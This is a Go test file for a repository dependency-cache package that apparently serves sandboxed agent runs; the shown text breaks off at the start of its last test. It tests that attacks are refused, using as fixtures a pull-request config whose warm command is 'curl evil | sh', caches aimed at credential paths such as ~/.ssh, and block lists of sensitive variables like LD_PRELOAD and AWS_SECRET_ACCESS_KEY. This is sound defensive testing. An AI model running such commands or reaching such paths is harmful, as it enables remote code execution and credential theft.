package repocache

import (
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"
)

func write(t *testing.T, p, s string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestRenderKeyHashesFiles(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, "go.sum"), "a v1\n")
	k1, err := RenderKey(`go-{{os}}-{{hash "go.sum"}}`, root)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(k1, "go-"+runtime.GOOS+"-") || len(k1) != len("go-"+runtime.GOOS+"-")+32 {
		t.Fatalf("key %q", k1)
	}
	again, _ := RenderKey(`go-{{os}}-{{hash "go.sum"}}`, root)
	if again != k1 {
		t.Fatal("key not stable")
	}
	write(t, filepath.Join(root, "go.sum"), "a v2\n")
	k2, _ := RenderKey(`go-{{os}}-{{hash "go.sum"}}`, root)
	if k2 == k1 {
		t.Fatal("key did not change with the file")
	}
	// ** reaches nested files; their content counts.
	write(t, filepath.Join(root, "sub", "x", "go.sum"), "b\n")
	k3, _ := RenderKey(`{{hash "**/go.sum"}}`, root)
	write(t, filepath.Join(root, "sub", "x", "go.sum"), "c\n")
	k4, _ := RenderKey(`{{hash "**/go.sum"}}`, root)
	if k3 == k4 {
		t.Fatal("nested file not hashed")
	}
	// No match hashes to "", a key then still renders from the rest.
	k5, err := RenderKey(`none-{{hash "nope.lock"}}x`, root)
	if err != nil || k5 != "none-x" {
		t.Fatalf("no-match key %q %v", k5, err)
	}
}

func TestRenderKeyRefuses(t *testing.T) {
	root := t.TempDir()
	for _, tmpl := range []string{
		``, `{{hash "/etc/passwd"}}`, `{{hash "../x"}}`, `a/b`, `.hidden`, `{{env "HOME"}}`, `a b`,
		strings.Repeat("k", 201),
	} {
		if k, err := RenderKey(tmpl, root); err == nil {
			t.Errorf("RenderKey(%q) = %q, want an error", tmpl, k)
		}
	}
}

func TestHashRefusesGlobsOutsideTheCheckout(t *testing.T) {
	parent := t.TempDir()
	root := filepath.Join(parent, "repo")
	write(t, filepath.Join(parent, "x"), "outside")
	write(t, filepath.Join(root, "go.sum"), "x")
	for _, g := range []string{"../x", "/etc/hostname", "a/../../x", "**/../x"} {
		if h, err := HashFiles(root, g); err == nil {
			t.Errorf("HashFiles(%q) = %q, want an error", g, h)
		}
		if k, err := RenderKey(`x-{{hash "`+g+`"}}`, root); err == nil {
			t.Errorf("key over %q rendered %q", g, k)
		}
	}
}

func TestHashNeverFollowsSymlinks(t *testing.T) {
	root := t.TempDir()
	outside := filepath.Join(t.TempDir(), "secret")
	write(t, outside, "SECRET")
	write(t, filepath.Join(root, "go.sum"), "x")
	base, _ := HashFiles(root, "go.sum")
	if err := os.Remove(filepath.Join(root, "go.sum")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(root, "go.sum")); err != nil {
		t.Fatal(err)
	}
	for _, globs := range [][]string{{"go.sum"}, {"go.sum", "**/go.sum"}} {
		h, err := HashFiles(root, globs...)
		if err != nil {
			t.Fatal(err)
		}
		if h != "" || h == base {
			t.Fatalf("%v: a symlinked file was hashed: %q", globs, h)
		}
	}
	// A symlinked directory is never walked.
	if err := os.Symlink(filepath.Dir(outside), filepath.Join(root, "linked")); err != nil {
		t.Fatal(err)
	}
	if h, _ := HashFiles(root, "**/secret"); h != "" {
		t.Fatalf("walked through a symlinked dir: %q", h)
	}
}

func TestGlobMatch(t *testing.T) {
	for _, c := range []struct {
		g, p string
		ok   bool
	}{
		{"go.sum", "go.sum", true}, {"go.sum", "a/go.sum", false}, {"**/go.sum", "go.sum", true},
		{"**/go.sum", "a/b/go.sum", true}, {"requirements*.txt", "requirements-dev.txt", true},
		{"a/**/x", "a/x", true}, {"a/**/x", "b/x", false},
	} {
		if got := globMatch(c.g, c.p); got != c.ok {
			t.Errorf("globMatch(%q,%q)=%v", c.g, c.p, got)
		}
	}
}

func TestParsePath(t *testing.T) {
	prot := []string{".claude", ".claude.json"}
	for _, ok := range []string{"~/go/pkg/mod", "~/.cache/go-build", "node_modules", "~/.npm", "build/cache"} {
		if _, err := ParsePath(ok, prot); err != nil {
			t.Errorf("ParsePath(%q): %v", ok, err)
		}
	}
	for _, bad := range []string{
		"", "~", "~/", "/abs", "~/../x", "a/../../x", "../x", ".", "~/.", ".git", "a/.git/x", "~root/x",
		"~/.ssh", "~/.ssh/id", "~/.gitconfig", "~/.config", "~/.config/git", "~/.bashrc", "~/.claude", "~/.claude/x",
		"~/.claude.json", "~/" + LayersDir, "a,b", "a:b", `a\b`,
	} {
		if p, err := ParsePath(bad, prot); err == nil {
			t.Errorf("ParsePath(%q) = %v, want refused", bad, p)
		}
	}
	p, _ := ParsePath("~/go//pkg/./mod", nil)
	if p.Area != AreaHome || p.Rel != "go/pkg/mod" {
		t.Fatalf("%+v", p)
	}
}

func TestEnvNames(t *testing.T) {
	for _, ok := range []string{"GOMODCACHE", "GOFLAGS", "npm_config_cache", "BUNDLE_PATH", "UV_CACHE_DIR"} {
		if err := CheckEnvName(ok); err != nil {
			t.Errorf("%s: %v", ok, err)
		}
	}
	for _, bad := range []string{"PATH", "HOME", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "GIT_SSH_COMMAND", "HTTPS_PROXY",
		"https_proxy", "NO_PROXY", "GITHUB_TOKEN", "NPM_TOKEN", "BASH_ENV", "NODE_OPTIONS", "SSL_CERT_FILE",
		"CONDUCTOR_SKILL_TOKEN", "AWS_SECRET_ACCESS_KEY", "1X", "A-B", ""} {
		if err := CheckEnvName(bad); err == nil {
			t.Errorf("%q allowed", bad)
		}
	}
}

func TestValidate(t *testing.T) {
	good := Cache{Name: "go", Key: "go-{{os}}", Paths: []string{"~/go/pkg/mod"}, Env: map[string]string{"GOFLAGS": "-modcacherw"}}
	if err := good.Validate(nil); err != nil {
		t.Fatal(err)
	}
	for name, c := range map[string]Cache{
		"bad name":  {Name: "../x", Key: "k", Paths: []string{"a"}},
		"no key":    {Name: "x", Paths: []string{"a"}},
		"bad tmpl":  {Name: "x", Key: "{{", Paths: []string{"a"}},
		"no paths":  {Name: "x", Key: "k"},
		"abs path":  {Name: "x", Key: "k", Paths: []string{"/etc"}},
		"overlap":   {Name: "x", Key: "k", Paths: []string{"~/a", "~/a/b"}},
		"bad env":   {Name: "x", Key: "k", Paths: []string{"a"}, Env: map[string]string{"LD_PRELOAD": "/x"}},
		"env ctrl":  {Name: "x", Key: "k", Paths: []string{"a"}, Env: map[string]string{"A": "x\ny"}},
		"bad rkey":  {Name: "x", Key: "k", RestoreKeys: []string{"{{"}, Paths: []string{"a"}},
		"too many ": {Name: "x", Key: "k", Paths: strings.Split("a b c d e f g h i j k l m n o p q", " ")},
	} {
		if err := c.Validate(nil); err == nil {
			t.Errorf("%s: validated", name)
		}
	}
}

func publish(t *testing.T, s *Store, repo, name, key string, created time.Time, files map[string]string) Entry {
	t.Helper()
	e, err := s.Publish(Meta{Repo: repo, Name: name, Key: key, Created: created, Paths: []string{"~/c"}}, func(data string) error {
		for rel, body := range files {
			write(t, filepath.Join(data, "home", "c", rel), body)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return e
}

func TestLookupExactPartialMiss(t *testing.T) {
	s := &Store{Dir: t.TempDir()}
	now := time.Now()
	publish(t, s, "o/r", "go", "go-linux-aaa", now.Add(-2*time.Hour), map[string]string{"f": "1"})
	publish(t, s, "o/r", "go", "go-linux-bbb", now.Add(-time.Hour), map[string]string{"f": "2"})
	publish(t, s, "o/r", "go", "go-darwin-ccc", now, map[string]string{"f": "3"})
	publish(t, s, "o/other", "go", "go-linux-zzz", now, map[string]string{"f": "4"})

	if e, kind, ok := s.Lookup("o/r", "go", "go-linux-aaa", []string{"go-linux-"}); !ok || kind != Exact || e.Key != "go-linux-aaa" {
		t.Fatalf("exact: %v %s %s", ok, kind, e.Key)
	}
	// The newest matching the first prefix that matches at all.
	if e, kind, ok := s.Lookup("o/r", "go", "go-linux-new", []string{"go-linux-", "go-"}); !ok || kind != Partial || e.Key != "go-linux-bbb" {
		t.Fatalf("partial: %v %s %s", ok, kind, e.Key)
	}
	if e, kind, ok := s.Lookup("o/r", "go", "go-x", []string{"nomatch-", "go-"}); !ok || kind != Partial || e.Key != "go-darwin-ccc" {
		t.Fatalf("second prefix: %v %s %s", ok, kind, e.Key)
	}
	if _, kind, ok := s.Lookup("o/r", "go", "go-linux-new", nil); ok || kind != Miss {
		t.Fatal("miss without prefixes")
	}
	// Another repository's caches are never restored.
	if e, _, ok := s.Lookup("o/r", "go", "go-linux-zzz", nil); ok {
		t.Fatalf("crossed repos: %s", e.Dir)
	}
	if _, _, ok := s.Lookup("../o", "go", "k", nil); ok {
		t.Fatal("bad repo looked up")
	}
}

func TestPublishIsAtomic(t *testing.T) {
	s := &Store{Dir: t.TempDir()}
	// A failing fill leaves nothing behind.
	_, err := s.Publish(Meta{Repo: "o/r", Name: "go", Key: "k1"}, func(data string) error {
		write(t, filepath.Join(data, "home", "c", "f"), "partial")
		return errors.New("boom")
	})
	if err == nil {
		t.Fatal("no error")
	}
	if _, _, ok := s.Lookup("o/r", "go", "k1", []string{"k"}); ok {
		t.Fatal("a failed publish is visible")
	}
	if ents, _ := os.ReadDir(s.nameDir("o/r", "go")); len(ents) != 0 {
		t.Fatalf("leftovers: %v", ents)
	}
	// While a publish is filling, nothing is visible.
	_, err = s.Publish(Meta{Repo: "o/r", Name: "go", Key: "k2"}, func(data string) error {
		write(t, filepath.Join(data, "home", "c", "f"), "x")
		if _, _, ok := s.Lookup("o/r", "go", "k2", []string{"k"}); ok {
			return errors.New("visible mid-publish")
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	// Racing publishes of one key: exactly one wins, the rest ErrExists,
	// and the winner's content is never replaced.
	var wg sync.WaitGroup
	var mu sync.Mutex
	wins, exists := 0, 0
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			_, err := s.Publish(Meta{Repo: "o/r", Name: "go", Key: "k3"}, func(data string) error {
				return os.WriteFile(filepath.Join(data, "who"), []byte(fmt.Sprint(i)), 0o600)
			})
			mu.Lock()
			defer mu.Unlock()
			switch {
			case err == nil:
				wins++
			case errors.Is(err, ErrExists):
				exists++
			default:
				t.Error(err)
			}
		}(i)
	}
	wg.Wait()
	if wins != 1 || exists != 7 {
		t.Fatalf("wins %d exists %d", wins, exists)
	}
	if ents, _ := os.ReadDir(s.nameDir("o/r", "go")); len(ents) != 2 {
		t.Fatalf("store has %d entries, want k2 and k3", len(ents))
	}
}

func TestEvictNeverRemovesInUse(t *testing.T) {
	s := &Store{Dir: t.TempDir()}
	now := time.Now()
	big := strings.Repeat("x", 64<<10)
	old := publish(t, s, "o/r", "a", "k-old", now.Add(-3*time.Hour), map[string]string{"f": big})
	mid := publish(t, s, "o/r", "a", "k-mid", now.Add(-2*time.Hour), map[string]string{"f": big})
	nw := publish(t, s, "o/r", "a", "k-new", now.Add(-1*time.Hour), map[string]string{"f": big})
	// Last use is what orders eviction: old was restored most recently.
	for _, e := range []Entry{mid, nw} {
		_ = os.Chtimes(filepath.Join(e.Dir, ".used"), now.Add(-time.Hour), now.Add(-time.Hour))
	}
	_ = os.Chtimes(filepath.Join(mid.Dir, ".used"), now.Add(-2*time.Hour), now.Add(-2*time.Hour))
	s.Touch(old)
	one := mid.Size
	// Cap at one entry; mid is in use, so nw (the LRU among the rest) goes,
	// and mid stays even though the store is then over its cap.
	removed := s.Evict(one, func(d string) bool { return d == mid.Dir })
	var keys []string
	for _, e := range removed {
		keys = append(keys, e.Key)
	}
	if !slices.Contains(keys, "k-new") || slices.Contains(keys, "k-mid") {
		t.Fatalf("removed %v", keys)
	}
	if _, err := os.Stat(mid.Dir); err != nil {
		t.Fatal("an in-use cache was evicted")
	}
}

func TestEvictHonoursLiveHomes(t *testing.T) {
	s := &Store{Dir: t.TempDir()}
	homes := t.TempDir()
	e := publish(t, s, "o/r", "a", "k", time.Now().Add(-time.Hour), map[string]string{"f": "x"})
	layers := filepath.Join(homes, "id@run", LayersDir)
	if err := os.MkdirAll(layers, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := writeUses(layers, []string{e.Dir}, nil); err != nil {
		t.Fatal(err)
	}
	m := &Manager{Store: s, MaxSize: 1, HomeRoots: []string{homes}}
	m.Evict()
	if _, err := os.Stat(e.Dir); err != nil {
		t.Fatal("evicted a cache a live home uses")
	}
	// The home gone, the cache goes.
	if err := RemoveAll(filepath.Join(homes, "id@run")); err != nil {
		t.Fatal(err)
	}
	m.Evict()
	if _, err := os.Stat(e.Dir); err == nil {
		t.Fatal("not evicted once unused")
	}
}

func TestResolvePrecedence(t *testing.T) {
	ws := t.TempDir()
	write(t, filepath.Join(ws, "go.sum"), "x")
	write(t, filepath.Join(ws, "package-lock.json"), "{}")
	f := false
	rf := &RepoFile{Version: 1, Caches: []Cache{
		{Name: "go", Key: "from-file", Paths: []string{"~/gofile"}},
		{Name: "tool", Key: "t", Paths: []string{"~/.tool"}},
	}}
	defs, warn := Resolve(Sources{
		Repo:     []Cache{{Name: "go", Key: "from-repo-config", Paths: []string{"~/gorepo"}}},
		Defaults: []Cache{{Name: "go", Key: "from-defaults", Paths: []string{"~/godef"}}, {Name: "tool", Disabled: true}},
		File:     rf, Recipes: Recipes(nil), Autodetect: true,
		Detect: func(g []string) bool { return DetectIn(ws, g) },
	})
	if len(warn) != 0 {
		t.Fatal(warn)
	}
	got := map[string]Def{}
	for _, d := range defs {
		got[d.Name] = d
	}
	if got["go"].Key != "from-repo-config" || got["go"].Origin != OriginConfig {
		t.Errorf("go: %+v", got["go"])
	}
	if _, ok := got["tool"]; ok {
		t.Error("a disabled default did not suppress the repo file's cache")
	}
	if got["npm"].Origin != OriginAutodetect {
		t.Errorf("npm: %+v", got["npm"])
	}
	// The repo file turns autodetect off for its repository.
	rf.Autodetect = &f
	defs, _ = Resolve(Sources{File: rf, Recipes: Recipes(nil), Autodetect: true, Detect: func(g []string) bool { return DetectIn(ws, g) }})
	for _, d := range defs {
		if d.Origin == OriginAutodetect {
			t.Errorf("autodetected %s with autodetect: false", d.Name)
		}
	}
}

func TestResolveRecipeReferenceAndInvalid(t *testing.T) {
	defs, warn := Resolve(Sources{
		Repo: []Cache{
			{Recipe: "go", Warm: "go mod download"},
			{Name: "evil", Key: "k", Paths: []string{"~/.ssh"}},
			{Name: "ghost", Recipe: "nope"},
		},
		Recipes: Recipes(nil),
	})
	if len(defs) != 1 || defs[0].Name != "go" || defs[0].Warm != "go mod download" || len(defs[0].Paths) != 2 {
		t.Fatalf("%+v", defs)
	}
	if len(warn) != 2 {
		t.Fatalf("warnings %v", warn)
	}
}

func TestAutodetectPerEcosystem(t *testing.T) {
	for file, want := range map[string]string{
		"go.sum": "go", "package-lock.json": "npm", "pnpm-lock.yaml": "pnpm", "yarn.lock": "yarn",
		"requirements.txt": "pip", "requirements-dev.txt": "pip", "uv.lock": "uv", "Cargo.lock": "cargo", "Gemfile.lock": "bundler",
	} {
		ws := t.TempDir()
		write(t, filepath.Join(ws, file), "x")
		defs, warn := Resolve(Sources{Recipes: Recipes(nil), Autodetect: true, Detect: func(g []string) bool { return DetectIn(ws, g) }})
		if len(warn) != 0 {
			t.Fatalf("%s: %v", file, warn)
		}
		if len(defs) != 1 || defs[0].Name != want {
			t.Errorf("%s detected %v, want %s", file, defs, want)
			continue
		}
		// Every bundled recipe renders a key over its own detect file.
		if k, err := RenderKey(defs[0].Key, ws); err != nil {
			t.Errorf("%s: key %q: %v", want, k, err)
		}
	}
	// Nothing to detect: nothing.
	defs, _ := Resolve(Sources{Recipes: Recipes(nil), Autodetect: true, Detect: func(g []string) bool { return DetectIn(t.TempDir(), g) }})
	if len(defs) != 0 {
		t.Fatal(defs)
	}
}

func TestBundledRecipesValidate(t *testing.T) {
	for _, r := range Bundled() {
		if err := r.Validate([]string{".claude", ".codex"}); err != nil {
			t.Errorf("%s: %v", r.Name, err)
		}
		if len(r.Detect) == 0 || r.Warm == "" {
			t.Errorf("%s: no detect or warm", r.Name)
		}
	}
}

func TestOperatorRecipesOverride(t *testing.T) {
	rs := Recipes([]Recipe{
		{Cache: Cache{Name: "go", Key: "mine", Paths: []string{"~/m"}}, Detect: []string{"go.mod"}},
		{Cache: Cache{Name: "npm", Disabled: true}},
		{Cache: Cache{Name: "deno", Key: "d", Paths: []string{"~/.deno"}}, Detect: []string{"deno.lock"}},
	})
	names := map[string]Recipe{}
	for _, r := range rs {
		names[r.Name] = r
	}
	if names["go"].Key != "mine" {
		t.Error("go not replaced")
	}
	if _, ok := names["npm"]; ok {
		t.Error("npm not removed")
	}
	if _, ok := names["deno"]; !ok {
		t.Error("deno not added")
	}
}

func TestParseRepoFile(t *testing.T) {
	rf, warn, err := ParseRepoFile([]byte(`
version: 1
future_setting: true
caches:
  - recipe: go
    shiny: 1
  - name: tools
    key: tools-{{hash "tools.lock"}}
    paths: [~/.tools]
`))
	if err != nil {
		t.Fatal(err)
	}
	if len(rf.Caches) != 2 || len(warn) != 2 {
		t.Fatalf("%+v %v", rf, warn)
	}
	if _, _, err := ParseRepoFile([]byte("version: 2\ncaches: []\n")); err == nil {
		t.Fatal("version 2 accepted")
	}
	if _, _, err := ParseRepoFile([]byte("caches: []\n")); err == nil {
		t.Fatal("no version accepted")
	}
	if _, _, err := ParseRepoFile([]byte(strings.Repeat("#", maxRepoFile+1))); err == nil {
		t.Fatal("oversized accepted")
	}
}

// fakeRepo is a repository with a default branch and the run's own (a PR
// head) checkout, which differ.
type fakeRepo struct {
	defaultFiles map[string]string
	commit       string
	checkouts    int
}

func (f *fakeRepo) file(ctx context.Context, repo, name string) ([]byte, string, error) {
	if b, ok := f.defaultFiles[name]; ok {
		return []byte(b), f.commit, nil
	}
	return nil, f.commit, nil
}

func (f *fakeRepo) checkout(ctx context.Context, repo, dst string) (string, error) {
	f.checkouts++
	for name, body := range f.defaultFiles {
		p := filepath.Join(dst, name)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			return "", err
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			return "", err
		}
	}
	return f.commit, nil
}

type harness struct {
	m      *Manager
	repo   *fakeRepo
	homes  string
	warmed []WarmRun
	logs   []string
	mu     sync.Mutex
}

func newHarness(t *testing.T, overlay bool) *harness {
	t.Helper()
	h := &harness{homes: t.TempDir(), repo: &fakeRepo{commit: "c0ffee", defaultFiles: map[string]string{
		"go.sum":         "default-branch deps\n",
		RepoFileName:     "version: 1\ncaches:\n  - name: tool\n    key: 'tool-{{hash \"tool.lock\"}}'\n    paths: [~/.tool]\n    warm: make-tool\n",
		"tool.lock":      "v1\n",
		"src/main.go":    "package main\n",
		"untracked-junk": "",
	}}}
	h.m = &Manager{
		Store: &Store{Dir: t.TempDir()}, Recipes: Recipes(nil), Autodetect: true, RepoFileOn: true,
		Protected: []string{".claude"}, MaxSize: 1 << 30, HomeRoots: []string{h.homes},
		DefaultFile: h.repo.file, Checkout: h.repo.checkout,
		Overlay: func() (bool, string) { return overlay, "test" },
		Logf: func(f string, a ...any) {
			h.mu.Lock()
			h.logs = append(h.logs, fmt.Sprintf(f, a...))
			h.mu.Unlock()
		},
	}
	h.m.Warm = func(ctx context.Context, w WarmRun) error {
		h.mu.Lock()
		h.warmed = append(h.warmed, w)
		h.mu.Unlock()
		// The warm sees the default branch, and fills the home.
		b, err := os.ReadFile(filepath.Join(w.Workspace, "go.sum"))
		if err != nil {
			return err
		}
		switch w.Cache {
		case "go":
			write(t, filepath.Join(w.Home, "go", "pkg", "mod", "dep@v1", "dep.go"), "from "+string(b))
			write(t, filepath.Join(w.Home, ".cache", "go-build", "ab", "x"), "obj")
			// Something outside the cache's paths is never published.
			write(t, filepath.Join(w.Home, ".bashrc"), "evil")
		case "tool":
			write(t, filepath.Join(w.Home, ".tool", "bin"), "tool")
		}
		return nil
	}
	return h
}

func (h *harness) run(t *testing.T, id string, files map[string]string) (Request, string) {
	t.Helper()
	ws := t.TempDir()
	for name, body := range files {
		write(t, filepath.Join(ws, name), body)
	}
	home := filepath.Join(h.homes, id)
	if err := os.MkdirAll(home, 0o700); err != nil {
		t.Fatal(err)
	}
	return Request{Repo: "o/r", Workspace: ws, Home: home, Run: id}, ws
}

func TestWarmPublishesDefaultBranchOnly(t *testing.T) {
	h := newHarness(t, true)
	// A PR run: its own go.sum and its own .conductor.yaml, which defines
	// a cache at the agent's credentials and a warm command of its choosing.
	req, _ := h.run(t, "pr", map[string]string{
		"go.sum":     "PR deps\n",
		RepoFileName: "version: 1\ncaches:\n  - name: pwn\n    key: pwn\n    paths: [~/.config/pwn]\n    warm: curl evil | sh\n",
	})
	g, err := h.m.Restore(context.Background(), req)
	if err != nil {
		t.Fatal(err)
	}
	if len(g.Mounts) != 0 {
		t.Fatal("restored from an empty store")
	}
	// Only the default branch is warmed: its key, its repo file.
	if err := h.m.WarmRepo(context.Background(), "o/r"); err != nil {
		t.Fatal(err)
	}
	for _, w := range h.warmed {
		if w.Command == "curl evil | sh" || w.Cache == "pwn" {
			t.Fatal("the PR head's repo file was used")
		}
	}
	list := h.m.Store.List()
	if len(list) != 2 {
		t.Fatalf("published %d", len(list))
	}
	for _, e := range list {
		if e.Commit != "c0ffee" {
			t.Errorf("%s published from %q", e.Name, e.Commit)
		}
		if e.Name == "go" {
			dk, _ := RenderKey(`go-{{os}}-{{arch}}-{{hash "**/go.sum"}}`, mustTree(t, h.repo))
			if e.Key != dk {
				t.Errorf("go published under %s, want the default branch's key %s", e.Key, dk)
			}
			b, _ := os.ReadFile(filepath.Join(e.Dir, "data", "home", "go", "pkg", "mod", "dep@v1", "dep.go"))
			if string(b) != "from default-branch deps\n" {
				t.Errorf("content %q", b)
			}
			if !slices.Equal(e.Paths, []string{"~/go/pkg/mod", "~/.cache/go-build"}) {
				t.Errorf("meta paths %v", e.Paths)
			}
			if _, err := os.Stat(filepath.Join(e.Dir, "data", "home", ".bashrc")); err == nil {
				t.Error("published a path outside the cache")
			}
		}
		if e.Origin == "" {
			t.Errorf("%s: no origin", e.Name)
		}
	}
	// A second warm with nothing changed runs no command.
	n := len(h.warmed)
	if err := h.m.WarmRepo(context.Background(), "o/r"); err != nil {
		t.Fatal(err)
	}
	if len(h.warmed) != n {
		t.Fatal("re-warmed a published key")
	}
}

func mustTree(t *testing.T, f *fakeRepo) string {
	d := filepath.Join(t.TempDir(), "tree")
	if _, err := f.checkout(context.Background(), "", d); err != nil {
		t.Fatal(err)
	}
	return d
}

// A run's own checkout never chooses its caches: the repository file a PR
// head carries (disabling a cache, adding one with its own env) is ignored
// at restore time; the default branch's is used.
func TestRestoreIgnoresThePRHeadsRepoFile(t *testing.T) {
	h := newHarness(t, true)
	if err := h.m.WarmRepo(context.Background(), "o/r"); err != nil {
		t.Fatal(err)
	}
	req, _ := h.run(t, "pr", map[string]string{
		"go.sum": "default-branch deps\n", "tool.lock": "v1\n",
		RepoFileName: "version: 1\nautodetect: false\ncaches:\n  - name: go\n    disabled: true\n  - name: tool\n    disabled: true\n" +
			"  - name: pwn\n    key: pwn\n    paths: [~/pwn]\n    env: {PWN: '1'}\n",
	})
	g, err := h.m.Restore(context.Background(), req)
	if err != nil {
		t.Fatal(err)
	}
	if len(g.Mounts) != 3 {
		t.Fatalf("the PR head's repo file changed the restore: %+v", g.Mounts)
	}
	for _, e := range g.Env {
		if strings.HasPrefix(e, "PWN=") {
			t.Fatalf("env from the PR head's repo file: %v", g.Env)
		}
	}
	for _, mt := range g.Mounts {
		if strings.HasSuffix(mt.Target, "/pwn") {
			t.Fatalf("mounted the PR head's cache: %+v", mt)
		}
	}
}

// A repository name that is not owner/name never reaches the filesystem:
// ".." would put the store's parent's caches in reach.
func TestLookupRefusesBadRepoNames(t *testing.T) {
	up := &Store{Dir: t.TempDir()}
	if _, err := up.Publish(Meta{Repo: "o/r", Name: "go", Key: "k"}, func(data string) error {
		return os.Mkdir(filepath.Join(data, "home"), 0o700)
	}); err != nil {
		t.Fatal(err)
	}
	s := &Store{Dir: filepath.Join(up.Dir, "o~r", "store")}
	for _, repo := range []string{"..", "../..", "o", ""} {
		if e, how, ok := s.Lookup(repo, "go", "k", []string{"k"}); ok || how != Miss {
			t.Errorf("Lookup(%q) = %s %+v", repo, how, e)
		}
	}
}

func TestRepoSlugsNeverCollide(t *testing.T) {
	s := &Store{Dir: t.TempDir()}
	seen := map[string]string{}
	for _, r := range []string{"a__b/c", "a/b__c", "a_/_b", "a/__b", "a.b/c", "a/b.c", "a-/b", "a/-b"} {
		if err := CheckRepo(r); err != nil {
			continue
		}
		d := s.nameDir(r, "go")
		if o, ok := seen[d]; ok {
			t.Fatalf("%s and %s share %s", o, r, d)
		}
		seen[d] = r
	}
	if len(seen) < 4 {
		t.Fatalf("too few valid names tested: %v", seen)
	}
}

func TestRestoreNeverWritesTheStore(t *testing.T) {
	h := newHarness(t, true)
	if err := h.m.WarmRepo(context.Background(), "o/r"); err != nil {
		t.Fatal(err)
	}
	before := snapshot(t, h.m.Store.Dir)
	req, _ := h.run(t, "main-run", map[string]string{"go.sum": "default-branch deps\n", "tool.lock": "v1\n"})
	g, err := h.m.Restore(context.Background(), req)
	if err != nil {
		t.Fatal(err)
	}
	if len(g.Mounts) != 3 {
		t.Fatalf("mounts %+v", g.Mounts)
	}
	for _, mt := range g.Mounts {
		if !within(mt.Upper, filepath.Join(req.Home, LayersDir)) || !within(mt.Lower, h.m.Store.Dir) {
			t.Errorf("mount %+v", mt)
		}
		if !within(mt.Target, req.Home) {
			t.Errorf("target %s", mt.Target)
		}
	}
	if !slices.Contains(g.Env, "GOFLAGS=-modcacherw") || !slices.Contains(g.Env, "GOMODCACHE="+req.Home+"/go/pkg/mod") {
		t.Errorf("env %v", g.Env)
	}
	if len(g.Hide) != 1 || g.Hide[0] != filepath.Join(req.Home, LayersDir) {
		t.Errorf("hide %v", g.Hide)
	}
	after := snapshot(t, h.m.Store.Dir)
	for p, v := range before {
		if strings.HasSuffix(p, ".used") {
			continue
		}
		if after[p] != v {
			t.Errorf("restore changed %s", p)
		}
	}
	if len(after) != len(before) {
		t.Errorf("restore added to the store: %d → %d", len(before), len(after))
	}
	// The home names what it uses, so eviction keeps it.
	if !h.m.InUse(g.Mounts[0].Lower[:strings.Index(g.Mounts[0].Lower, "/data/")]) {
		t.Error("an overlaid cache is not in use")
	}
}

func snapshot(t *testing.T, root string) map[string]string {
	out := map[string]string{}
	_ = filepath.Walk(root, func(p string, fi os.FileInfo, err error) error {
		if err == nil && !fi.IsDir() {
			b, _ := os.ReadFile(p)
			out[p] = string(b) + fi.Mode().String()
		}
		return nil
	})
	return out
}

func TestRestorePartialAndWarmOnMiss(t *testing.T) {
	h := newHarness(t, true)
	h.m.WarmOnMiss = true
	if err := h.m.WarmRepo(context.Background(), "o/r"); err != nil {
		t.Fatal(err)
	}
	h.m.lastWarm["o/r"] = time.Time{}
	n := len(h.warmed)
	// A PR that changed go.sum: the go cache is a partial restore (the
	// default branch's), and a warm of the default branch is started.
	req, _ := h.run(t, "pr2", map[string]string{"go.sum": "new deps\n", "tool.lock": "v1\n"})
	if _, err := h.m.Restore(context.Background(), req); err != nil {
		t.Fatal(err)
	}
	h.m.Wait()
	if !hasLog(h, "go (autodetect): partial") {
		t.Errorf("no partial log: %v", h.logs)
	}
	if h.repo.checkouts != 2 {
		t.Errorf("checkouts %d: a miss did not warm the default branch", h.repo.checkouts)
	}
	if len(h.warmed) != n {
		t.Error("the default branch's key was already published, yet its command ran")
	}
	// Within minWarmGap, another miss starts nothing.
	if _, err := h.m.Restore(context.Background(), req); err != nil {
		t.Fatal(err)
	}
	h.m.Wait()
	if h.repo.checkouts != 2 {
		t.Error("warmed again within the gap")
	}
}

func hasLog(h *harness, s string) bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	for _, l := range h.logs {
		if strings.Contains(l, s) {
			return true
		}
	}
	return false
}

func TestRestoreRefusesSymlinkAndNonEmptyTargets(t *testing.T) {
	h := newHarness(t, true)
	if err := h.m.WarmRepo(context.Background(), "o/r"); err != nil {
		t.Fatal(err)
	}
	req, _ := h.run(t, "r", map[string]string{"go.sum": "default-branch deps\n", "tool.lock": "v1\n"})
	elsewhere := t.TempDir()
	if err := os.Symlink(elsewhere, filepath.Join(req.Home, "go")); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(req.Home, ".tool", "mine"), "the run's own")
	g, err := h.m.Restore(context.Background(), req)
	if err != nil {
		t.Fatal(err)
	}
	for _, mt := range g.Mounts {
		if strings.Contains(mt.Target, "/go/") || strings.HasSuffix(mt.Target, "/.tool") {
			t.Errorf("restored onto %s", mt.Target)
		}
	}
	if len(g.Mounts) != 1 {
		t.Errorf("mounts %+v", g.Mounts)
	}
	// A layers dir the agent replaced with a symlink is conductor's again.
	if err := RemoveAll(filepath.Join(req.Home, LayersDir)); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(elsewhere, filepath.Join(req.Home, LayersDir)); err != nil {
		t.Fatal(err)
	}
	if _, err := h.m.Restore(context.Background(), req); err != nil {
		t.Fatal(err)
	}
	if fi, err := os.Lstat(filepath.Join(req.Home, LayersDir)); err != nil || fi.Mode()&os.ModeSymlink != 0 {
		t.Fatal("the layers dir is still a symlink")
	}
	if ents, _ := os.ReadDir(elsewhere); len(ents) != 0 {
		t.Fatalf("wrote through the symlink: %v", ents)
	}
}

func TestRestoreByCopy(t *testing.T) {
	h := newHarness(t, false)
